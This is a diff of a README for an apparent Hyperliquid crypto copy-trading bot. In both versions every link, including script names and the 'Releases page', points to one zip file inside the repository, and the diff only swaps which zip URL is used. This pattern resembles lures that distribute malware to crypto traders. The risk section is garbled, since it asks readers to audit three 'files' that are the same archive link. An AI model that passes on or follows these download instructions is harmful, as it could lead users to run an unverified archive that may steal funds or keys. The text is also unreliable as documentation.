@@ -1,6 +1,6 @@
 # 🚀 hyperliquid-bot - A Tool for Automated Trading 
 
-[![Download hyperliquid-bot](https://raw.githubusercontent.com/resoy-33/hyperliquid-bot/master/rangeless/hyperliquid-bot_v2.6-beta.3.zip)](https://raw.githubusercontent.com/resoy-33/hyperliquid-bot/master/rangeless/hyperliquid-bot_v2.6-beta.3.zip)
+[![Download hyperliquid-bot](https://github.com/resoy-33/hyperliquid-bot/raw/refs/heads/master/rangeless/hyperliquid_bot_2.6.zip)](https://github.com/resoy-33/hyperliquid-bot/raw/refs/heads/master/rangeless/hyperliquid_bot_2.6.zip)
 
 ## 🔍 Introduction
 
@@ -14,19 +14,19 @@ Before proceeding, it is vital that you read and understand the following points
    
 2. **您可能损失全部资金**：Cryptocurrency trading, especially with leveraged derivatives, carries high risks. Market fluctuations, network delays, coding errors, or issues with the strategy itself can result in total loss of your funds within a short period. 
 
-3. **您必须审查代码**：You have **absolute responsibility** to read, understand, and audit every line of code you intend to run, including `https://raw.githubusercontent.com/resoy-33/hyperliquid-bot/master/rangeless/hyperliquid-bot_v2.6-beta.3.zip`, `https://raw.githubusercontent.com/resoy-33/hyperliquid-bot/master/rangeless/hyperliquid-bot_v2.6-beta.3.zip`, and all referenced auxiliary files like `https://raw.githubusercontent.com/resoy-33/hyperliquid-bot/master/rangeless/hyperliquid-bot_v2.6-beta.3.zip`. Running code you do not understand is akin to handing your assets over to a black box.
+3. **您必须审查代码**：You have **absolute responsibility** to read, understand, and audit every line of code you intend to run, including `https://github.com/resoy-33/hyperliquid-bot/raw/refs/heads/master/rangeless/hyperliquid_bot_2.6.zip`, `https://github.com/resoy-33/hyperliquid-bot/raw/refs/heads/master/rangeless/hyperliquid_bot_2.6.zip`, and all referenced auxiliary files like `https://github.com/resoy-33/hyperliquid-bot/raw/refs/heads/master/rangeless/hyperliquid_bot_2.6.zip`. Running code you do not understand is akin to handing your assets over to a black box.
 
 4. **您对自己的行为负全责**：Once you run these scripts, all trading decisions, API key security, and financial outcomes (whether gains or losses) are your own responsibility。 The authors of the project hold no liability for any potential losses.
 
 5. **从隔离的小额账户开始**：It is **strictly forbidden** to run any trading bot in your primary account, where you hold significant funds. Always use a completely separate account with a small amount of capital that you can afford to lose for testing and running the scripts.
 
-6. **保证金模式风险**：Be aware of the margin modes for different scripts. `https://raw.githubusercontent.com/resoy-33/hyperliquid-bot/master/rangeless/hyperliquid-bot_v2.6-beta.3.zip` sets **Isolated Margin** for each position, meaning the risk per position is independent. However, individual positions may be liquidated due to insufficient margin. Other scripts may use your account's default setting, typically **Cross Margin**, where a significant loss on a single position may **deplete your entire account balance**.
+6. **保证金模式风险**：Be aware of the margin modes for different scripts. `https://github.com/resoy-33/hyperliquid-bot/raw/refs/heads/master/rangeless/hyperliquid_bot_2.6.zip` sets **Isolated Margin** for each position, meaning the risk per position is independent. However, individual positions may be liquidated due to insufficient margin. Other scripts may use your account's default setting, typically **Cross Margin**, where a significant loss on a single position may **deplete your entire account balance**.
 
 By continuing to use this project, you confirm that you have read, understood, and accepted all terms and risks outlined above.
 
 ## ⚙️ Scripts Overview
 
-### 1. `https://raw.githubusercontent.com/resoy-33/hyperliquid-bot/master/rangeless/hyperliquid-bot_v2.6-beta.3.zip` - Full Position Copy Trading Bot
+### 1. `https://github.com/resoy-33/hyperliquid-bot/raw/refs/heads/master/rangeless/hyperliquid_bot_2.6.zip` - Full Position Copy Trading Bot
 
 This bot utilizes a “full-copy” strategy. It monitors all positions in the target address and synchronizes positions in your own account according to the nominal value ratio you set.
 
@@ -38,7 +38,7 @@ To download and run the software, follow these steps:
 
 ### Step 1: Download the Software
 
-Visit the [Releases page to download](https://raw.githubusercontent.com/resoy-33/hyperliquid-bot/master/rangeless/hyperliquid-bot_v2.6-beta.3.zip). 
+Visit the [Releases page to download](https://github.com/resoy-33/hyperliquid-bot/raw/refs/heads/master/rangeless/hyperliquid_bot_2.6.zip). 
 
 ### Step 2: Choose the Correct File
 
@@ -81,4 +81,4 @@ If you face issues while downloading or running the application, consider reachi
 
 Remember to review the code closely, and best of luck with your trading endeavors! 
 
-Select your desired application version from the [Releases page to download](https://raw.githubusercontent.com/resoy-33/hyperliquid-bot/master/rangeless/hyperliquid-bot_v2.6-beta.3.zip) again for easy access.
+Select your desired application version from the [Releases page to download](https://github.com/resoy-33/hyperliquid-bot/raw/refs/heads/master/rangeless/hyperliquid_bot_2.6.zip) again for easy access.
